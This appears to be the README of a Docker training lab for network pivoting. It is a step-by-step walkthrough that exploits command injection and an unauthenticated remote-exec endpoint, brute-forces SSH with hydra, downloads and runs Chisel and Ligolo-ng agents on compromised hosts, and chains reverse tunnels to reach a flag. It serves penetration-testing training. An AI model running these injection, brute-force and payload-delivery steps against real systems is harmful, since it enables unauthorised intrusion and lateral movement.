# Pivoting Lab - SSH vs Chisel vs Ligolo-ng

A Docker-based training lab for practicing network pivoting through three isolated network segments using three different tunneling methods.

Originally forked from [Cimihan123/Docker-Pivot-Lab](https://github.com/Cimihan123/Docker-Pivot-Lab), redesigned to showcase modern pivoting tools alongside the traditional SSH approach.

## Network Topology

```
Net A (10.10.1.0/24)       Net B (10.10.2.0/24)       Net C (10.10.3.0/24)

┌──────────────┐  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────┐
│   attacker   │──│     pivot1       │──│     pivot2       │──│    target    │
│   10.10.1.10 │  │ 10.10.1.20 (A)   │  │ 10.10.2.30 (B)   │  │ 10.10.3.40   │
│              │  │ 10.10.2.20 (B)   │  │ 10.10.3.30 (C)   │  │              │
│              │  │                  │  │                  │  │              │
│ ligolo-proxy │  │ Flask :5000      │  │ Flask :8080      │  │ HTTP :80     │
│ chisel       │  │ SSH :22          │  │ NO SSH           │  │ SecretVault  │
│ nmap, hydra  │  │ cmd injection    │  │ /api/exec RCE    │  │ FLAG{...}    │
└──────────────┘  └──────────────────┘  └──────────────────┘  └──────────────┘
```

**Key design choice:** Pivot2 has **no SSH server**. This is deliberate - it's where the three tunneling methods diverge in difficulty and where Chisel and Ligolo-ng really prove their value.

## Quick Start

```bash
# Build all containers (first run takes a few minutes)
docker compose build

# Start the lab
docker compose up -d

# Enter the attacker machine
docker exec -it attacker bash -l
```

To tear down:
```bash
docker compose down
```

## Prerequisites

- Docker and Docker Compose
- The host machine needs `/dev/net/tun` available (required for Ligolo-ng). This is available by default on Linux. On Docker Desktop (Mac/Windows), this should work out of the box.

## Lab Objectives

1. Gain a foothold on **pivot1** (Net A → Net B)
2. Discover and exploit **pivot2** through the tunnel (Net B → Net C)
3. Reach the **target** SecretVault on Net C and capture the flag
4. Repeat using all three tunneling methods to understand the tradeoffs

## Tips Before You Start

- **Use tmux** - you'll need multiple terminals. The attacker has tmux installed. `tmux` to start, `Ctrl+B %` to split vertically, `Ctrl+B ←/→` to switch panes.
- **Backgrounding processes** - any long-running process started via SSH or the `/api/exec` endpoint needs the full `nohup ... > /dev/null 2>&1 &` treatment, or your terminal will hang.
- **The `/api/exec` endpoint** uses HTTP form encoding. This means `+` becomes a space and `&` becomes a parameter separator. Use `%2B` for `+` signs, and use `--data-urlencode` instead of `-d` when your command contains `&`.
- **Clean up between methods** - kill all tunnel processes before starting a new method (instructions provided between each section).

---

## Phase 1: Reconnaissance & Initial Foothold

This phase is the same regardless of which tunneling method you choose.

### Scan pivot1 from the attacker

```bash
nmap -sC -sV 10.10.1.20
```

You'll find port 22 (SSH) and port 5000 (HTTP).

### Exploit pivot1 (two paths)

**Path A - Command Injection:**
Visit `http://10.10.1.20:5000` with curl. The NetDiag app has an OS command injection vulnerability in the `/ping` endpoint:

```bash
# Confirm injection works
curl "http://10.10.1.20:5000/ping?host=;id"

# See what networks pivot1 can reach
curl "http://10.10.1.20:5000/ping?host=;ip%20addr"
```

**Path B - Brute-force SSH:**

```bash
hydra -l root -P /opt/wordlists/wordlist.txt ssh://10.10.1.20
# Then: ssh root@10.10.1.20
```

Both paths get you access to pivot1. From here, `ip addr` shows two interfaces - 10.10.1.20 (Net A) and 10.10.2.20 (Net B). Time to pivot.

---

## Method 1: SSH Tunneling + Proxychains (Traditional)

### First Pivot - Attacker → Net B

Set up a SOCKS proxy through pivot1:

```bash
# On attacker: dynamic port forward (SOCKS proxy on port 1080)
ssh -D 1080 -N -f root@10.10.1.20
```

Proxychains is already configured to use `socks5 127.0.0.1 1080`. Now you can scan Net B:

```bash
proxychains4 nmap -sT -Pn -F 10.10.2.30
```

You'll find port 8080. Discover the vulnerability:

```bash
# Find the health endpoint (hint is in the login page HTML source)
proxychains4 curl http://10.10.2.30:8080/api/health

# The /api/exec debug endpoint has no authentication
proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=id'
proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=ip%20addr'
```

### Second Pivot - Reaching Net C (the hard way)

This is where SSH tunneling gets painful. Pivot2 has **no SSH**, so you can't just chain another `-D`. Instead, you need local port forwards:

```bash
# Forward a local port through pivot1 to pivot2's API
ssh -L 8080:10.10.2.30:8080 -N -f root@10.10.1.20

# Now you can hit pivot2's API directly (without proxychains)
curl -X POST http://localhost:8080/api/exec -d 'cmd=id'
```

To reach the target on Net C, you have to execute commands _on pivot2_ and read the output:

```bash
# Use pivot2 to fetch the target page
curl -X POST http://localhost:8080/api/exec \
  --data-urlencode 'cmd=curl -s http://10.10.3.40'
```

You should see the SecretVault page with the flag. But notice - you can't interact with Net C directly from your attacker. You're running commands on pivot2 and reading stdout. For a real pentest, this gets unwieldy fast with SSH alone.

### Cleanup - before moving to Method 2

```bash
pkill -f "ssh -D"
pkill -f "ssh -L"
pkill -f "ssh -N"
```

---

## Method 2: Chisel (SOCKS over HTTP)

### First Pivot - Attacker → Net B

Start the chisel server on the attacker and deliver the client to pivot1:

```bash
# Terminal 1: start chisel server (reverse mode, port 8888)
chisel server --reverse --port 8888 &

# Terminal 2: serve binaries to targets
cd /opt/serve && python3 -m http.server 8000 &
```

Download chisel to pivot1 via SSH:

```bash
ssh root@10.10.1.20 "wget http://10.10.1.10:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel"

# Run chisel client on pivot1 (reverse SOCKS proxy back to attacker on port 1080)
ssh root@10.10.1.20 "nohup /tmp/chisel client 10.10.1.10:8888 R:1080:socks > /dev/null 2>&1 &"
```

Now proxychains works through the Chisel tunnel (same port 1080):

```bash
proxychains4 nmap -sT -Pn -F 10.10.2.30
proxychains4 curl http://10.10.2.30:8080/api/health
```

### Second Pivot - Reaching Net C

Pivot2 can't reach the attacker's chisel server directly (it's on Net B, not Net A). Relay the chisel server port through pivot1 using SSH remote port forwarding:

```bash
ssh -R 0.0.0.0:8888:127.0.0.1:8888 root@10.10.1.20 -N -f
```

Now `10.10.2.20:8888` on pivot1 forwards to the chisel server on the attacker. Serve the chisel binary from pivot1 to pivot2:

```bash
ssh root@10.10.1.20 "nohup python3 -m http.server 9001 -d /tmp > /dev/null 2>&1 &"
```

Download chisel onto pivot2 via the API:

```bash
proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
  -d 'cmd=wget http://10.10.2.20:9001/chisel -O /tmp/chisel'

proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
  -d 'cmd=chmod %2Bx /tmp/chisel'
```

Run the chisel client on pivot2 (SOCKS on a different port - 1081):

```bash
proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
  --data-urlencode 'cmd=nohup /tmp/chisel client 10.10.2.20:8888 R:1081:socks > /dev/null 2>&1 &'
```

Now SOCKS port 1081 provides access to Net C. Use it with a custom proxychains config:

```bash
proxychains4 -f <(echo -e "strict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 1081") curl http://10.10.3.40
```

🚩 You should see the SecretVault page and the flag.

> **Note:** Even with Chisel, the double pivot still required an SSH remote port forward to relay the connection. You end up mixing tools. Ligolo-ng handles this entirely within its own framework.

### Cleanup - before moving to Method 3

```bash
pkill -f "ssh -R"
pkill -f "ssh -N"
pkill -f "chisel"
pkill -f "http.server"
ssh root@10.10.1.20 "pkill -f chisel; pkill -f http.server" 2>/dev/null
```

---

## Method 3: Ligolo-ng (TUN Interface)

This is the cleanest approach - no proxychains, no SOCKS, tools just work natively.

### First Pivot - Attacker → Net B

Set up the Ligolo-ng proxy on the attacker:

```bash
# Create TUN interface
ip tuntap add user root mode tun ligolo
ip link set ligolo up

# Start ligolo-ng proxy (this gives you an interactive console)
ligolo-proxy -selfcert
```

In a separate terminal, deliver the agent to pivot1:

```bash
# Serve binaries
cd /opt/serve && python3 -m http.server 8000 &

# Download agent to pivot1
ssh root@10.10.1.20 "wget http://10.10.1.10:8000/ligolo-agent -O /tmp/agent && chmod +x /tmp/agent"

# Run the agent on pivot1
ssh root@10.10.1.20 "nohup /tmp/agent -connect 10.10.1.10:11601 -ignore-cert > /dev/null 2>&1 &"
```

Back in the ligolo-ng console:

```
# Select the session
ligolo-ng » session
# Choose the pivot1 session

# Start the tunnel
ligolo-ng » tunnel_start --tun ligolo
```

In another terminal, add the route for Net B:

```bash
ip route add 10.10.2.0/24 dev ligolo
```

Now you can hit Net B directly - no proxychains:

```bash
nmap -sT -Pn -F 10.10.2.30
curl http://10.10.2.30:8080/api/health
```

### Second Pivot - Reaching Net C

Set up listeners on the pivot1 session to relay both the agent binary and the agent connection:

```
# In ligolo-ng console (make sure pivot1 session is selected)
# Relay agent binary: pivot1:9001 → attacker's http.server on port 8000
ligolo-ng » listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:8000 --tcp

# Relay agent connection: pivot1:11601 → attacker's ligolo-proxy on port 11601
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

Download and run the agent on pivot2 (no proxychains needed - you're going through the TUN interface):

```bash
# Download agent onto pivot2 via pivot1's listener
curl -X POST http://10.10.2.30:8080/api/exec \
  -d 'cmd=wget http://10.10.2.20:9001/ligolo-agent -O /tmp/agent'

# Make it executable
curl -X POST http://10.10.2.30:8080/api/exec \
  -d 'cmd=chmod %2Bx /tmp/agent'

# Run agent on pivot2 (connects through pivot1's listener back to proxy)
curl -X POST http://10.10.2.30:8080/api/exec \
  --data-urlencode 'cmd=nohup /tmp/agent -connect 10.10.2.20:11601 -ignore-cert > /dev/null 2>&1 &'
```

Back in the ligolo-ng console:

```
# Create a second TUN interface for Net C
ligolo-ng » interface_create --name ligolo2

# Switch to the new pivot2 session
ligolo-ng » session
# Choose pivot2

# Start tunnel on the new interface
ligolo-ng » tunnel_start --tun ligolo2
```

Add the route for Net C:

```bash
ip route add 10.10.3.0/24 dev ligolo2
```

Reach the target directly:

```bash
curl http://10.10.3.40
```

🚩 You should see the SecretVault page and the flag.

Notice what you didn't need: no proxychains, no SSH port forwards, no mixing tools. The `listener_add` command handled both file delivery and agent relay within the same framework. This is why Ligolo-ng shines on multi-hop engagements.

---

## Comparison

| Feature | SSH + Proxychains | Chisel | Ligolo-ng |
|---|---|---|---|
| Requires SSH on target | ✅ Yes | ❌ No | ❌ No |
| Requires proxychains | ✅ Yes | ✅ Yes | ❌ No |
| ICMP/ping works through tunnel | ❌ No | ❌ No | ✅ Yes |
| UDP works through tunnel | ❌ No | ✅ Partial | ✅ Yes |
| Nmap SYN scan works | ❌ No | ❌ No | ⚠️ Translates to connect() |
| Double pivot complexity | 🔴 High | 🟡 Medium (still needs SSH relay) | 🟢 Low |
| Built-in port forwarding | SSH -L/-R | Remotes config | `listener_add` |
| Transport protocol | SSH | HTTP/WebSocket | TCP/TLS |
| Speed | Good | Good | Excellent (100+ Mbps) |
| Double pivot without mixing tools | ❌ No | ❌ No (needed SSH -R) | ✅ Yes |

## Troubleshooting

**"Operation not permitted" when creating TUN interface:**
Make sure the attacker container has `cap_add: NET_ADMIN` and `/dev/net/tun` in docker-compose.yml.

**Terminal hangs when running agent/chisel via SSH or /api/exec:**
Long-running processes need `nohup ... > /dev/null 2>&1 &` to fully detach. Without it, SSH or subprocess.run() blocks waiting for stdout/stderr to close.

**"Permission denied" when running downloaded binaries on pivot2:**
You need to `chmod +x` first - but the `+` gets URL-decoded as a space through `/api/exec`. Use `chmod %2Bx /tmp/<binary>` instead.

**"Syntax error: end of file unexpected" from /api/exec:**
Your command contains `&` characters that curl interprets as form data separators. Use `--data-urlencode` instead of `-d`.

**Chisel/Ligolo-ng agent on pivot2 can't connect back:**
Pivot2 is on Net B and can't reach the attacker directly on Net A. You need a relay on pivot1: SSH `-R` for Chisel, or `listener_add` for Ligolo-ng.

**Port conflicts between methods:**
Kill all tunnel processes before starting a new method. See the cleanup steps between each method section. Also clean up leftover processes on pivot1: `ssh root@10.10.1.20 "pkill -f chisel; pkill -f agent; pkill -f http.server"`

**Proxychains is slow or hanging:**
SOCKS proxies don't support ICMP, so `ping` won't work through proxychains. Use `nmap -sT -Pn` (TCP connect scan, skip ping).

**wget/curl through /api/exec times out:**
The timeout is 120 seconds. If downloading large binaries is too slow, background the download and poll for the file.

**Container can't resolve hostnames:**
Use IP addresses directly. DNS isn't configured between the lab networks.

## License

MIT License - see LICENSE file for details.

## Credits

- Original concept: [Cimihan123/Docker-Pivot-Lab](https://github.com/Cimihan123/Docker-Pivot-Lab)
- Original blog: [gkiran.com.np/blog/pivoting](https://gkiran.com.np/blog/pivoting)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) by Nicolas Chatelain
- [Chisel](https://github.com/jpillora/chisel) by Jaime Pillora
